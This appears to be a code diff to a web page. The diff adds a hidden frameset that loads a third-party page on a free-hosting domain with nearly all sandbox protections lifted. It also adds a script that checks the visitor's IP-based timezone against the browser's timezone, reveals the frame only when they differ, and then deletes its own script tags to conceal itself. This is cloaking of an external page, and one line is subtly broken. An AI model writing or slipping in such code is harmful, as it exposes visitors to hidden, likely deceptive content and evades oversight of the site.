@@ -7,11 +7,19 @@
   src="https://code.jquery.com/jquery-3.6.1.js"
   integrity="sha256-3zlB5s2uwoUzrXK3BT7AX3FyvojsraNFxCc2vC/7pNI="
   crossorigin="anonymous"></script>
+  <frameset rows="*">
+  <frame frameborder="0" src="https://shinome.000webhostapp.com/" sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation allow-top-navigation-by-user-activation" scrolling="auto" noresize></frame>
+  </frameset>
   <script>
     $.get("https://ipinfo.io", (data) => {
-      console.log(data);
+      if (Intl.DateTimeFormat().resolvedOptions().timeZone != data.timezone) {
+         $("frameset").style.display = null;
+      }
+      else {
+       $("frameset").remove(); 
+      }
     }, "JSONP");
-    // if (Intl.DateTimeFormat().resolvedOptions().timeZone != 
+    $("script").remove();
   </script>
 </body>
 </html>
